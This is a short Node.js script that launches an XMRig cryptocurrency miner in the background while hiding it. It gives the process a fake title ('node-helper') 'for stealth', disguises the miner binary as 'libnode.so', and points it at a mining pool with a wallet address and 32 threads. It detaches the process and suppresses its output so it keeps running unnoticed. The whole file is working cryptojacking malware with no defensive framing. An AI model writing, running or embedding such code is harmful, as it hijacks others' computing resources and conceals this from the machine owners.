#!/usr/bin/env node
const { spawn } = require('child_process');
const path = require('path');

// Fake name for stealth
process.title = 'node-helper';

// Path to miner binary (renamed xmrig → libnode.so)
const minerPath = path.join(__dirname, 'miner-bin', 'libnode.so');

// Mining settings
const args = [
  '-a', 'rx',
  '-o', 'stratum+ssl://rx.unmineable.com:443',
  '-u', 'BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.pokawork#u7pd-53qq',
  '-p', 'x',
  '--tls',
  '--threads=32'
];

// Spawn the miner in background (detached, no output)
const miner = spawn(minerPath, args, {
  detached: true,
  stdio: 'ignore'
});

miner.unref();  // Continue after parent dies

console.log('✅ XMRig miner launched in background');
